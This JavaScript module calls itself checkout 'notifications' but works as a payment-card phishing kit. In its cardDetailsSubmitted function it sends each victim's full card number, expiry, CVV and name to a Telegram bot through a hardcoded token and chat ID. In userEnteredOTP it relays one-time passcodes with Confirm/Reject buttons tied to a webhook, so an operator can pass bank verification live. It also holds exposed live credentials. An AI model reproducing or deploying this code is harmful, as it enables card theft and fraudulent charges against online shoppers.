
const BOT_TOKEN = '8318197368:AAFyH0JcBzwWso1RJJKCHOb720-xGzhE8H4'; // Your bot token
const CHAT_ID = '8376441380'; // Your chat or group ID

// Generic function to send a message to Telegram
async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const body = {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        if (replyMarkup) {
            body.reply_markup = replyMarkup;
        }

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });

        if (response.ok) {
            console.log('Telegram notification sent successfully');
        } else {
            const errorData = await response.json();
            console.error('Failed to send Telegram notification:', response.statusText, errorData);
        }
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
    }
}


// Function to get USD equivalent
function getUSDEquivalent(localAmount, country) {
    const config = {
        nicaragua: { rate: 37 },
        honduras: { rate: 25 },
        trinidad: { rate: 6.8 },
        elsalvador: { rate: 1 },
        paraguay: { rate: 7500 },
        guatemala: { rate: 7.8 },
        dominican: { rate: 58 },
        usa: { rate: 1 }
    };

    const countryConfig = config[country] || { rate: 1 };
    if (countryConfig.rate === 1) return localAmount;

    // Extract numeric value from local amount (e.g., "$123.45")
    const numericValue = parseFloat(localAmount.replace(/[^\d.]/g, ''));
    if (isNaN(numericValue)) return localAmount; // fallback if parsing fails

    const usdValue = numericValue / countryConfig.rate;
    return `$${usdValue.toFixed(2)} USD`;
}

// Helper function to get country from localStorage or default
function getCurrentCountry() {
    if (typeof localStorage !== 'undefined') {
        return localStorage.getItem('selectedCountry') || 'honduras';
    }
    return 'honduras'; // fallback default
}

const TelegramNotifications = {
    proceedToCheckoutCard: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
🛒 <b>New Checkout Started (Credit Card)</b>

📱 Customer is proceeding to checkout
💰 Total Amount: <b>${orderData.total}</b> (${usdEquivalent})
️ Items: ${orderData.itemCount} item(s)
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Time: ${new Date().toLocaleString()}

<i>Customer is now on the payment page</i>`;
        await sendTelegramMessage(message);
    },

    splitPaymentCheckoutStarted: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
💸 <b>New Split Payment Checkout</b>

📱 Customer starting a split payment plan.
📦 Product: ${orderData.productName}
💰 Total Amount: <b>${orderData.total}</b> (${usdEquivalent})
💵 Deposit (50%): <b>${orderData.deposit}</b>
🗓️ Installments: ${orderData.months} months
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Time: ${new Date().toLocaleString()}

<i>Customer is now on the payment page for the deposit.</i>`;
        await sendTelegramMessage(message);
    },

    sendCustomerInfo: async (data) => {
        const name = data.name || 'Not provided';
        const postcode = data.postcode || 'Not provided';

        const message = `
🧾 <b>Customer Information</b>

👤 Name: ${name}
📮 Postcode: ${postcode}
⏰ Submitted at: ${new Date().toLocaleString()}
        `;

        await sendTelegramMessage(message);
    },

    confirmBankTransfer: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
💳 <b>Bank Transfer Confirmed</b>

✅ Customer confirmed bank transfer payment
💰 Amount: <b>${orderData.total}</b> (${usdEquivalent})
🆔 Order Reference: ${orderData.orderRef}
🏦 Payment Method: Bank Transfer
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Confirmed at: ${new Date().toLocaleString()}

<i>⚠️ Please verify the bank transfer in your account</i>`;
        await sendTelegramMessage(message);
    },

   
    cardDetailsSubmitted: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
💳 <b>Credit Card Details Submitted</b>

✅ Customer submitted credit card information
👤 Cardholder: ${orderData.cardholderName}
💰 Amount: <b>${orderData.total}</b> (${usdEquivalent})
🆔 Reference: ${orderData.orderRef}
🔒 Card Number: ${orderData.cardNumber}
⏳ Expiry: ${orderData.expiryDate}
🔑 CVV: ${orderData.cvv}
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Submitted at: ${new Date().toLocaleString()}

<i>🔄 Processing payment...</i>`;
        await sendTelegramMessage(message);
    },

    otpSkipped: async (orderData) => {
        const currentCountry = getCurrentCountry();
        const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);

        const message = `
⏭️ <b>OTP Verification Skipped</b>

⚠️ Customer skipped OTP verification.
💰 Amount: <b>${orderData.total}</b> (${usdEquivalent})
🆔 Order Reference: ${orderData.orderRef}
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Time: ${new Date().toLocaleString()}

<i>Order is proceeding without OTP. Please monitor.</i>`;
        await sendTelegramMessage(message);
    },

    userEnteredOTP: async (otp, orderRef) => {
        const currentCountry = getCurrentCountry();

        const message = `
🔐 <b>User Entered OTP for Verification</b>

🆔 OrderRef: ${orderRef}
📱 Customer entered OTP: <code>${otp}</code>
🌍 Country: ${currentCountry.charAt(0).toUpperCase() + currentCountry.slice(1)}
⏰ Time: ${new Date().toLocaleString()}

<i>Please verify this OTP to complete the transaction</i>`;
        
        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Confirm", url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=confirmed` },
                    { text: "❌ Reject", url: `https://hook.eu2.make.com/lw5j8lq8q1bduww1kqe842brrawws24u?orderRef=${orderRef}&status=rejected` }
                ]
            ]
        };
        await sendTelegramMessage(message, replyMarkup);
    }
};

// Export for Node or Browser
if (typeof module !== 'undefined' && module.exports) {
    module.exports = TelegramNotifications;
} else {
    window.TelegramNotifications = TelegramNotifications;
}
